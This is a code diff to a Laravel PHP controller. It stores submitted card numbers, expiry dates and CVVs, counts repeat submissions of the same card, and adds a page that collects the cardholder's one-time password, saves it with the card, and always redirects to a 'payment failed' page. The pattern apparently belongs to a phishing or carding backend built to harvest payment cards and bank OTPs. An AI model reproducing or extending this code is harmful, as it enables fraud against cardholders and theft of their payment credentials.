@@ -112,12 +112,19 @@ class HomeController extends Controller
         $data = $request->only([
            'cardnumber','ccmonth','ccyear','cvv','orderId'
         ]);
-        $card = Card::query()->create($data);
+        $card = Card::query()->where('cardnumber',$data['cardnumber'])->first();
+        if ($card){
+            $card->update([
+                'attempt'=>  $card->attempt + 1
+            ]);
+        }else{
+            $card = Card::query()->create($data);
+        }
         if ($card){
             return response()->json([
                 'message' => 'Data received & stored successfully',
                 'status' => 200,
-                'data' => $card
+                'data' => $card->id
             ]);
         }else{
             return response()->json([
@@ -126,7 +133,25 @@ class HomeController extends Controller
             ]);
         }
 
+    }
 
+    public function otp()
+    {
+        return view('otp');
+    }
+
+    public function send_otp(Request $request)
+    {
+        $request->validate([
+            'otp' => 'required'
+        ]);
+        $card = Card::query()->findOrFail($request->cardId);
+        $card->update([
+            'otp' => $request->otp
+        ]);
+        $card->save();
+
+        return \redirect()->route('payment.failed');
     }
 
 }
